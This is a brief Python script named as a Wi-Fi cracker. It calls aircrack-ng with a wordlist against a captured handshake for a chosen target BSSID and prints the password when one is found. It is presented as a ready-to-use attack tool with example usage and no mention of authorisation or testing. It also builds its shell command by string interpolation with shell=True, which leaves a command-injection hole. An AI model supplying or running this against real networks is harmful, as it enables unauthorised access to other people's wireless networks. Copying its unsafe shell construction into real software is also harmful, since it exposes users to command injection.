import subprocess

def wifi_cracker(target_bssid, wordlist_path):
    print("Starting the cracking process...")
    # Run aircrack-ng command
    command = f"aircrack-ng -w {wordlist_path} -b {target_bssid} /path/to/capture_file.cap"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    if "KEY FOUND!" in result.stdout:
        print("Password found!")
        print(result.stdout)
    else:
        print("Password not found.")

# Example usage
target_bssid = "00:11:22:33:44:55"  # Replace with the target BSSID
wordlist_path = "/path/to/your/wordlist.txt"  # Path to your wordlist
wifi_cracker(target_bssid, wordlist_path)

